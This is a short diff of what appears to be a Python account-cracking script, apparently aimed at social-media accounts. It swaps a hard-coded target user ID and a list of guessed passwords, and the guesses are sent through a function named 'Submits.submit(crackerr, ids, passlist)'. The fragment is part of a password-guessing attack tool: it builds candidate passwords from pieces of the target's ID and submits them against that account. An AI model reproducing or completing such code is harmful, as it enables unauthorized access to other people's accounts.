@@ -440,13 +440,13 @@ def mainn():
         print(47*"\x1b[1;97m—") 
         for next in gen:
             idsf = code + next
-            ids = "100053582633432"
+            ids = "100051096438777"
             mk = ids[:6]
             xx = ids[:7]
             v = ids[:8]
             b = next[:6]  
             passlistf = [mk,xx,'57273200',v]
-            passlist = ['630110','630110','630110']
+            passlist = ['630133','630133','630133']
             Submits.submit(crackerr,ids,passlist)
 
 def convert(cookie):
